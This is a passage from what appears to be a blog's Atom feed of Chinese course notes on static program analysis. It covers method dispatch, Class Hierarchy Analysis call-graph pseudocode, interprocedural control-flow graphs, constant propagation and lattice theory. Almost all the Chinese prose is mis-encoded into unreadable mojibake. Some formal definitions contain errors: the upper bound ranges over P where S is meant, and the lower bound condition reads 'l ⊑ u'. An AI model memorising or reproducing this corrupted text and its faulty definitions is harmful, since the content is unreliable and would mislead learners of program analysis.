å‡½æ•°ã€ç§æœ‰å®ä¾‹å‡½æ•°ã€çˆ¶ç±»å®ä¾‹å‡½æ•°</td><td>å…¶ä»–å®ä¾‹æ–¹æ³•</td></tr><tr><td>ç›®æ ‡æ–¹æ³•ä¸ªæ•°</td><td>1</td><td>1</td><td>â‰¥1ï¼ˆå¤šæ€ï¼‰</td></tr><tr><td>ç»‘å®šæ—¶é—´</td><td>ç¼–è¯‘æ—¶</td><td>ç¼–è¯‘æ—¶</td><td>è¿è¡Œæ—¶</td></tr></tbody></table></div><p>å¯ä»¥çœ‹åˆ°ï¼Œå¤„ç†è™šè°ƒç”¨æ˜¯æ„é€ è°ƒç”¨å›¾çš„å…³é”®ã€‚</p><h2 id="Method-Dispatch"><a href="#Method-Dispatch" class="headerlink" title="Method Dispatch"></a>Method Dispatch</h2><p>åœ¨è¿è¡Œæ—¶ï¼Œvirtualcallè°ƒç”¨ï¼ˆ$o^1.foo(\dots)^2$ï¼‰çš„å‡½æ•°ä¸»è¦åŸºäºä¸¤ç‚¹ï¼š</p><ol><li>è°ƒç”¨è€…å®ä¾‹å¯¹è±¡ç±»å‹($o^1$ æŒ‡é’ˆ)ï¼Œè®°ä¸º $c$</li><li>è°ƒç”¨ç‚¹çš„å‡½æ•°ç­¾åï¼Œè®°ä¸º$m$</li></ol><p><strong>å‡½æ•°ç­¾åï¼š</strong>åŒ…æ‹¬ç±»åã€æ–¹æ³•åã€ä»¥åŠæ–¹æ³•æè¿°ç¬¦ï¼ˆdescriptorï¼‰ï¼Œä¸‹å›¾ä¸ºç¤ºä¾‹ï¼Œå‡½æ•°ç­¾åè¡¨ç¤ºä¸º<code>C.foo(P, Q, R)</code><br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817210616520.png" alt="image-20200817210616520"></p><p>å¯ä»¥çœ‹åˆ°æ–¹æ³•æè¿°ç¬¦åŒ…æ‹¬äº†å‡½æ•°çš„è¿”å›å€¼ç±»å‹å’Œå‚æ•°ç±»å‹ã€‚</p><p>å®šä¹‰å‡½æ•° $\mathrm{Dispatch}(c,m)$ï¼Œè¯¥å‡½æ•°æ¨¡æ‹Ÿè¿è¡Œæ—¶ç©¶ç«Ÿè°ƒç”¨å“ªä¸ªå‡½æ•°</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><p>å³å½“virtualinvokeæ—¶ï¼Œå¦‚æœå½“å‰ç±» $c$ ä¸­å­˜åœ¨ä¸€ä¸ªéæŠ½è±¡å‡½æ•° $mâ€™$ ï¼Œè¯¥å‡½æ•°åç§°å’Œæ‘˜è¦ä¸$m$ç›¸åŒï¼Œé‚£ä¹ˆè°ƒç”¨è¯¥å‡½æ•°ï¼›</p><p>å¦åˆ™é€’å½’ï¼Œå¯¹ $c$ çš„<strong>çˆ¶ç±»</strong>è°ƒç”¨ $Dispatch$ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥æ–¹æ³•ã€‚</p><h1 id="CHAï¼ˆClass-Hierarchy-Analysisï¼‰"><a href="#CHAï¼ˆClass-Hierarchy-Analysisï¼‰" class="headerlink" title="CHAï¼ˆClass Hierarchy Analysisï¼‰"></a>CHAï¼ˆClass Hierarchy Analysisï¼‰</h1><p>å½“è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œè§£æè°ƒç”¨ç±»å®šä¹‰ï¼Œæ ¹æ®å®šä¹‰ç±»æšä¸¾å…¶<strong>æ‰€æœ‰å­ç±»</strong>ï¼Œæ‰€æœ‰å­ç±»ç¬¦åˆè¦æ±‚çš„å‡½æ•°éƒ½æ˜¯å¯èƒ½ä¼šè¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>é€šè¿‡æ£€æŸ¥Açš„æ‰€æœ‰å­ç±»ï¼Œå¯»æ‰¾è¢«è°ƒç”¨å‡½æ•°</p><p>å…·ä½“ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Resolve</span><span class="params">(cs)</span>:</span> <span class="comment"># csä¸ºcall site</span></span><br><span class="line">T = &#123;&#125; <span class="comment"># ç®—æ³•æœ€ç»ˆè¾“å‡ºcsæ‰€æœ‰å¯èƒ½è°ƒç”¨çš„å‡½æ•°é›†åˆ</span></span><br><span class="line">    m = method signature at cs</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ staticcallï¼Œç›´æ¥å°†è¯¥å‡½æ•°åŠ å…¥é›†åˆ</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a static call:</span><br><span class="line">    T = &#123; m &#125; </span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯ specialcallï¼Œè¦å¤„ç†ä¸‰ç§æ–¹æ³•ï¼Œå–æ–¹æ³•mçš„ç±»cmï¼Œå¹¶è°ƒç”¨Dispatch()å¾—åˆ°æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> special call:</span><br><span class="line">        cm = <span class="class"><span class="keyword">class</span> <span class="title">type</span> <span class="title">of</span> <span class="title">m</span></span></span><br><span class="line">        T = &#123; Dispatch(cm, m) &#125;</span><br><span class="line">    <span class="comment"># è‹¥ cs æ˜¯virtualcallï¼Œé¦–å…ˆè·å–åŒ…æ‹¬csè‡ªèº«ç±»åœ¨å†…çš„æ‰€æœ‰å­ç±»ï¼Œåœ¨å°†å…¶dispatch()ç»“æœåŠ å…¥é›†åˆTä¸­</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a virtual call:</span><br><span class="line">        c = declared type of receiver variable at cs </span><br><span class="line">        <span class="keyword">for</span> each sub_c that <span class="keyword">is</span> a subclass of c <span class="keyword">or</span> C itself:</span><br><span class="line">            add Dispatch(sub_c, m) to T</span><br><span class="line">    <span class="keyword">return</span> T</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºå®é™…ç¤ºä¾‹ï¼Œæ³¨æ„ï¼ŒCHAåªè€ƒè™‘å£°æ˜ç±»å‹ï¼Œä¸è§£æå®ä¾‹ï¼Œå› æ­¤åœ¨åé¢Bå³ä½¿å®ä¾‹åŒ–ä¸ºnew B()ï¼Œä½†æ˜¯è§£æä»ç„¶æœ‰3ç§ï¼Œè¿™ä¹Ÿçœ‹å‡ºäº†CHAçš„ç¼ºé™·ã€‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200817213356449.png" alt="image-20200817213356449"></p><h2 id="CHAç‰¹å¾"><a href="#CHAç‰¹å¾" class="headerlink" title="CHAç‰¹å¾"></a>CHAç‰¹å¾</h2><ul><li>å¿«<ul><li>åªè€ƒè™‘å£°æ˜</li><li>å¿½ç•¥æ•°æ®æµå’Œæ§åˆ¶æµ</li></ul></li><li>ä¸å‡†<ul><li>å¯¼è‡´å‡ç›®æ ‡æ–¹æ³•</li></ul></li><li>IDEå¸¸ç”¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚è¯´ IDEAï¼‰</li></ul><h2 id="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"><a href="#ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG" class="headerlink" title="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"></a>ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG</h2><ol><li><p>ä»ä¸€äº›å…¥å£å‡½æ•°å¼€å§‹ï¼ˆå¦‚<code>main()</code>ï¼‰</p></li><li><p>å¯¹äºæ¯ä¸€ä¸ªåˆ°è¾¾çš„æ–¹æ³• $m$ï¼Œç”¨CHAè§£æå…¶ä¸­æ¯ä¸ªcall sitesï¼Œå³ï¼ˆ$Resolve(cs)$ï¼‰</p></li><li><p>é‡å¤ç›´åˆ°æ²¡æœ‰æ–°çš„å‡½æ•°éœ€è¦è¢«å‘ç°</p></li></ol><p>å¯ä»¥ç”¨DFSæˆ–è€…BFSå®ç°ï¼Œ ä»¥ä¸‹ä¸ºBFSæœç´¢ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BuildCallGraph(m_entry):</span><br><span class="line">WL = [m_entry] <span class="comment"># å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line">CG = &#123;&#125; <span class="comment"># å­˜æ”¾callgraphï¼Œè¾¹çš„é›†åˆ</span></span><br><span class="line">RM = &#123;&#125; <span class="comment"># å¯è¾¾çš„æ–¹æ³•ï¼ˆbookï¼‰</span></span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">remove m <span class="keyword">from</span> WL</span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM then add m to RM</span><br><span class="line">        <span class="comment"># é€šè¿‡ CHA è§£æm()ä¸­çš„æ‰€æœ‰è°ƒç”¨ cs</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> m:</span><br><span class="line">     T = Resolve(cs)</span><br><span class="line"><span class="keyword">for</span> target_method <span class="keyword">in</span> T:</span><br><span class="line">add (cs â†’ target_method) to CG <span class="comment"># å°†è°ƒç”¨åŠ å…¥åˆ°Callgraphä¸­</span></span><br><span class="line">add target_method to WL</span><br><span class="line"><span class="keyword">return</span> CG</span><br></pre></td></tr></table></figure><h1 id="Interprocedural-Control-Flow-Graph"><a href="#Interprocedural-Control-Flow-Graph" class="headerlink" title="Interprocedural Control-Flow Graph"></a>Interprocedural Control-Flow Graph</h1><p>ICFGï¼ˆInterprocedural Control-Flow Graphï¼‰ï¼Œåœ¨CFGåŸºç¡€ä¸ŠåŠ ä¸ŠCall edgeså’ŒReturn edges</p><ul><li>Call edgesï¼šä»è°ƒç”¨ç‚¹ï¼ˆcall sitesï¼‰å‡ºå‘è‡³è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleesï¼‰</li><li>Return edgesï¼šä»è¢«è°ƒå‡½æ•°returnè¯­å¥å‡ºå‘è‡³è°ƒç”¨ç‚¹çš„ä¸‹ä¸€æ¡è¯­å¥ï¼ˆreturn sitesï¼‰</li></ul><p>e.g.,<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818202917677.png" alt="image-20200818202917677"></p><p>æ³¨æ„åœ¨æ·»åŠ ä¸¤æ¡è¾¹åï¼ŒåŸå…ˆçš„è¾¹å¹¶ä¸åˆ å»ã€‚</p><h1 id="Interprocedural-Data-Flow-Analysis"><a href="#Interprocedural-Data-Flow-Analysis" class="headerlink" title="Interprocedural Data-Flow Analysis"></a>Interprocedural Data-Flow Analysis</h1><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå³åœ¨ ICFG ä¸Šåšåˆ†æ</p><p>åœ¨ Transfer functions ä¸­é™¤äº† CFG ä¸­çš„ Node transfer è¿˜åŠ äº† edge transferï¼š</p><ul><li>Call edge transferï¼šåœ¨ call node è‡³ callee çš„ç¬¬ä¸€ä¸ªnode ä¸Šä¼ é€’æ•°æ®æµï¼ˆä¼ å‚æ•°ï¼‰</li><li>Return edge transferï¼šåœ¨ return node è‡³ return site ä¸Šä¼ é€’æ§åˆ¶æµï¼ˆä¼ è¿”å›å€¼ï¼‰</li></ul><h2 id="Interprocedural-Constant-Propagation"><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h2><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå¹¶æ²¡æœ‰åƒè¿‡ç¨‹å†…åˆ†æé‚£æ ·æœ‰è§„èŒƒçš„ç®—æ³•ï¼Œè¿™é‡Œä»¥å¸¸é‡ä¼ æ’­ä¸ºä¾‹ï¼Œè§£é‡Šè¿‡ç¨‹é—´åˆ†æè¿‡ç¨‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818204421280.png" alt="image-20200818204421280"></p><p>å¯¹äºéå‡½æ•°è°ƒç”¨è¯­å¥ï¼Œä»ç„¶ç”¨node transferå¤„ç†ï¼Œé‡åˆ°å‡½æ•°è°ƒç”¨ï¼ˆcall expressionï¼‰æ—¶ï¼š</p><ol><li>killæ‰å·¦è¾¹çš„å˜é‡çš„å€¼</li><li>ç”± <strong>Call edge transfer</strong> å°†å®å‚ä¼ é€’è‡³callee enter å¤„ï¼Œåœ¨calleeä¸Šä¸‹æ–‡åšè¿‡ç¨‹é—´åˆ†æ</li><li>åˆ†æè‡³callee returnæ—¶ï¼Œç”±<strong>Return edge transfer</strong>å°†è‡³ä¼ å›callerä¸Šä¸‹æ–‡</li></ol><p><strong>å…³äºæ˜¯å¦ä¿ç•™call-to-return edgeï¼š</strong></p><p>ä¿ç•™call-to-return edgeï¼Œå¯ä»¥ä¿ç•™callerä¸Šä¸‹æ–‡æ•°æ®å˜é‡ï¼Œè‹¥æ²¡æœ‰è¿™æ¡è¾¹åˆ™éœ€è¦æŠŠå½“å‰å‡½æ•°ä¸Šä¸‹æ–‡å˜é‡ä¼ è¿›è¢«è°ƒå‡½æ•°ï¼ˆå¦‚åˆ†æ <code>ten()</code> æ—¶ï¼Œéœ€è¦ä¼ é€’<code>a, b, c</code>ï¼‰ï¼Œè¿™æ˜¯ä½æ•ˆçš„ã€‚</p><p><strong>æ³¨æ„</strong>åœ¨call expressionæ—¶ï¼Œå…ˆæŠŠleftçš„å€¼killæ‰ï¼ˆå¦‚è°ƒç”¨<code>ten()</code>æ˜¯ï¼Œå…ˆæŠŠbçš„å€¼killï¼Œå¦åˆ™ä¼šäº§ç”Ÿå†²çªï¼‰</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚ä¸»è¦è®²äº†è¿‡ç¨‹é—´åˆ†æä¸»è¦æ–¹æ³•ï¼Œå³å…ˆç”ŸæˆCallgraphï¼Œå†åˆæˆICFGè¿›è¡Œæ•°æ®æµåˆ†æï¼Œå¹¶ä¸”ä»‹ç»äº†ä¸€ä¸ªç®€å•çš„ç”ŸæˆCallGraphçš„æ–¹æ³•â€”â€”CHAï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°CHAæœ‰è¾ƒå¤§ç¼ºé™·ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;è¿‡ç¨‹å†…åˆ†æé‡åˆ°å‡½æ•°è°ƒç”¨åªèƒ½åšä¿å®ˆå‡è®¾ï¼Œå¯¼è‡´è¿‡å¤šè¯¯æŠ¥ï¼Œè€Œè¿‡ç¨‹é—´åˆ†æå¯ä»¥è·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œå› æ­¤æ›´å‡†ç¡®&lt;/p&gt;&lt;h1 id=&quot;Call-Graph-Construction&quot;&gt;&lt;a href=&quot;#Call-Graph-Construction&quot; class=&quot;headerlink&quot; title=&quot;Call Graph Construction&quot;&gt;&lt;/a&gt;Call Graph Construction&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt; A call graph is a set of call edges from  call-sites to their target methods (callees)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="è¿‡ç¨‹é—´åˆ†æ" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-08-17T13:12:11.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Iterative-Algorithm"><a href="#Iterative-Algorithm" class="headerlink" title="Iterative Algorithm"></a>Iterative Algorithm</h1><ul><li><p>å¯¹äºä¸€ä¸ªå« $k$ ä¸ªèŠ‚ç‚¹çš„CFGï¼Œæ¯ä¸ªè¿­ä»£ç®—æ³•å¯¹äºæ¯ä¸ªnode $n$ æ›´æ–°$\mathrm{OUT}[n]$ã€‚</p></li><li><p>å‡è®¾è¿­ä»£ç®—æ³•çš„ç ”ç©¶å¯¹è±¡ï¼ˆdomainï¼‰æ˜¯$V$ï¼Œå®šä¹‰ä¸€ä¸ªkå…ƒç»„$V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$ï¼Œ$V^k\in(V_1 \times V_2 \times \dots \times V_k)$ï¼Œ$V^k$ å³ä¸€æ¬¡è¿­ä»£äº§ç”Ÿçš„è¾“å‡ºï¼Œæ¯æ¬¡è¿­ä»£ä¼šæ›´æ–°$V^k$ï¼Œå¯ä»¥å°†æ¯æ¬¡è¿­ä»£ç»è¿‡transfer functionså’Œcontrol-flow handingçš„è¿‡ç¨‹æŠ½è±¡ä¸º$F: V^k\rightarrow {V^{k}}â€™$</p></li><li><p>å½“$V^k\rightarrow {V^{k}}â€™$æ—¶ï¼Œå³$X=F(X)$ ï¼Œç§°$F(x)$åœ¨$X$å¤„åˆ°è¾¾äº†<strong>ä¸åŠ¨ç‚¹</strong>ï¼Œ$X$ä¸º$F(x)$çš„ä¸åŠ¨ç‚¹ï¼Œ</p></li></ul><a id="more"></a><h1 id="Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰"><a href="#Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰" class="headerlink" title="Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰"></a>Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰</h1><blockquote><p>We define <strong>poset</strong> as a pair (P, âŠ‘) where âŠ‘ is a binary relation that defines a partial ordering over P, and âŠ‘ has the following properties: </p><p>(1) $\forall x \in P, x \sqsubseteq x$  (Reflexivity, è‡ªåæ€§)<br>(2) $\forall x, y \in P, x \sqsubseteq y \wedge y \sqsubseteq x \Rightarrow x=y \quad$ (Antisymmetryï¼Œåå¯¹ç§°æ€§)<br>(3) $\forall x,y,z \in P, x \sqsubseteq y \wedge y \sqsubseteq z \Rightarrow x \sqsubseteq z $ (Transitivityï¼Œä¼ é€’æ€§)</p></blockquote><p><strong>ååºé›†</strong>ä¸ºä¸€ä¸ªäºŒå…ƒç»„$(P, \sqsubseteq)$ï¼Œ$P$ä¸ºä¸€é›†åˆï¼Œ$\sqsubseteq$ä¸ºåœ¨é›†åˆä¸Šçš„ä¸€ç§æ¯”è¾ƒå…³ç³»ï¼Œè¿™ä¸ªäºŒå…ƒç»„ä¸ºååºé›†å½“ä¸”ä»…å½“é›†åˆå…ƒç´ åœ¨å…³ç³»ä¸Šæ»¡è¶³è‡ªåæ€§ã€åå¯¹ç§°æ€§å’Œä¼ é€’æ€§ã€‚</p><p><strong>ååº</strong>çš„å«ä¹‰ï¼šä¸€ä¸ªé›†åˆä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ ä¸ä¸€å®šå­˜åœ¨é¡ºåºå…³ç³»ï¼ˆä»»æ„ä¸¤å…ƒç´ ä¸ä¸€å®šèƒ½æ¯”è¾ƒå¤§å°ï¼‰</p><h1 id="Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"><a href="#Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰" class="headerlink" title="Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"></a>Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰</h1><blockquote><p>Given a poset (P, âŠ‘) and its subset $S$ that  $S\subseteq P$, we say that $u\in P$ is an <strong>upper bound</strong> of $S$, if $\forall x \in P, x\sqsubseteq u$. Similarly, $lâˆˆP$ is an <strong>lower bound</strong> of $S$, if $\forall x \in P, l\sqsubseteq u$.</p></blockquote><p>å¦‚å›¾ï¼Œ$\{a,b,c\}$æ˜¯$S$çš„ä¸Šç•Œï¼ˆç°è‰²ï¼‰ï¼Œ$\{\}$æ˜¯$S$çš„ä¸‹ç•Œï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200804204606009.png" alt="image-20200804204606009"></p><h2 id="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"><a href="#æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ" class="headerlink" title="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"></a>æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ</h2><blockquote><p>We define the <strong>least upper bound (lub or join)</strong> of $S$, written $âŠ”S$, if for every upper bound of $S$, say $u, âŠ”SâŠ‘u$. Similarly, We define the <strong>greatest lower bound (glb or meet)</strong> of $S$, written $âŠ“S$, if for every lower bound of $S$, say $l, lâŠ‘âŠ“S$.</p></blockquote><p>ç‰¹åˆ«çš„ï¼Œå¯¹äºä»…æœ‰ä¸¤ä¸ªå…ƒç´ çš„é›†åˆ$S=\{a,b\}$ï¼Œ$\sqcup S$ å¯ä»¥å†™ä¸º$a \sqcup b$ï¼ŒåŒç† $\sqcap S$å¯ä»¥å†™ä¸º $a\sqcap b$ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>ï¼ˆæœ€å°ï¼‰ä¸Šç•Œå’Œï¼ˆæœ€å¤§ï¼‰ä¸‹ç•Œæ˜¯é’ˆå¯¹é›†åˆä¸­çš„ç‰¹å®šå­é›†çš„ï¼Œè€Œä¸Šä¸‹ç•Œæœ¬èº«ä¸ä¸€å®šåœ¨å­é›†ä¸­ï¼Œå¹¶ä¸”ï¼š</p><ul><li>ä¸æ˜¯æ‰€æœ‰ååºé›†å‡å­˜åœ¨lubæˆ–è€…glbï¼ˆå¦‚å…ˆå‰ç°è‰²çš„é›†åˆå°±ä¸å«lubï¼‰</li><li>å¦‚æœä¸€ä¸ªååºé›†å­˜åœ¨lubå’Œglbï¼Œé‚£ä¹ˆå®ƒæ˜¯å”¯ä¸€çš„<ul><li>è¯æ˜ï¼š è®¾$g_1$ å’Œ$g_2$ åŒä¸º P çš„glbï¼Œé‚£ä¹ˆæ ¹æ®å®šä¹‰ $g_1\sqsubseteq (g_2 = \sqcap P)$ å¹¶ä¸”$g_2\sqsubseteq (g_1 = \sqcap P)$ï¼Œåˆå› ä¸ºåå¯¹ç§°æ€§ï¼Œæ‰€ä»¥$g_1=g_2$</li></ul></li></ul><h1 id="Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="Lattice, Semilattice, Complete and Product Lattice"></a>Lattice, Semilattice, Complete and Product Lattice</h1><h2 id="Latticeï¼ˆæ ¼ï¼‰"><a href="#Latticeï¼ˆæ ¼ï¼‰" class="headerlink" title="Latticeï¼ˆæ ¼ï¼‰"></a>Latticeï¼ˆæ ¼ï¼‰</h2><blockquote><p>Given a poset $(P, âŠ‘), âˆ€a,bâˆˆP$, if $aâŠ”b$ and $aâŠ“b$ exist, then $(P,âŠ‘)$ is called a lattice. </p></blockquote><p>å¦‚æœä¸€ä¸ªååºé›†çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ éƒ½æœ‰æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸€ååºé›†æ˜¯ä¸€ä¸ª<strong>æ ¼</strong></p><h2 id="Semilattice"><a href="#Semilattice" class="headerlink" title="Semilattice"></a>Semilattice</h2><p>æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œåªå­˜åœ¨ä¸€ä¸ªçš„ååºé›†ç§°<strong>åŠæ ¼</strong>ï¼Œåªå­˜åœ¨æœ€å°ä¸Šç•Œç§°ä¸ºâ€œjoin semilatticeâ€ï¼Œåªå­˜åœ¨æœ€å¤§ä¸‹ç•Œç§°ä¸ºâ€œmeet semilatticeâ€ã€‚</p><h2 id="Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰"><a href="#Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰" class="headerlink" title="Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*"></a>Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*</h2><blockquote><p>Given a lattice $(P,âŠ‘)$, for arbitrary subset $S$ of $P$, if $âŠ”S$ and $âŠ“S$ exist, then $(P,âŠ‘)$ is called a complete lattice.</p></blockquote><p>ä¸€ä¸ªååºé›†çš„ä»»æ„å­é›†å‡å­˜åœ¨æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸ªååºé›†æˆä¸º<strong>å…¨æ ¼</strong>ã€‚</p><p>æ¯ä¸ªå…¨æ ¼éƒ½å­˜åœ¨ä¸€ä¸ªæœ€å¤§å…ƒç´  topï¼ˆ$\top=\sqcup P$ï¼‰å’Œæœ€å°å…ƒç´ bottomï¼ˆ$\perp=\sqcap P$ï¼‰</p><p>æ‰€æœ‰å…ƒç´ æœ‰é™çš„æ ¼ï¼ˆfinite latticeï¼‰å‡æ˜¯å…¨æ ¼ã€‚ï¼ˆåä¹‹ä¸æˆç«‹ï¼‰</p><h2 id="Product-Lattice"><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h2><blockquote><p>Given lattices $L_1=(P_1,âŠ‘_1),L_2=(P_2,âŠ‘_2),â€¦,L_n=(P_n,âŠ‘)n)$, if for all $i$, $(P_i,âŠ‘_i)$ has $âŠ”i$(least upper bound) and $âŠ“_i$(greatest lower bound), then we can have a product lattice $L^n=(P,âŠ‘)$ that is defined by:</p><ul><li>$P=P_{1} \times \ldots \times P_{n}$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqsubseteq\left(y_{1}, \ldots, y_{n}\right) \Leftrightarrow\left(x_{1} \sqsubseteq y_{1}\right) \wedge \ldots \wedge\left(x_{n} \sqsubseteq y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcup\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcup_{1} y_{1}, \ldots, x_{n} \cup_{n} y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcap\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcap_{1} y_{1}, \ldots, x_{n} \sqcap_{n} y_{n}\right)$</li></ul></blockquote><p>Product Latticeä»æ˜¯Latticeï¼Œè‹¥æ¯ä¸ªå­æ ¼ä¸ºå…¨æ ¼ï¼Œé‚£ä¹ˆä¹˜ç§¯ä¹Ÿæ˜¯å…¨æ ¼ã€‚</p><h1 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis 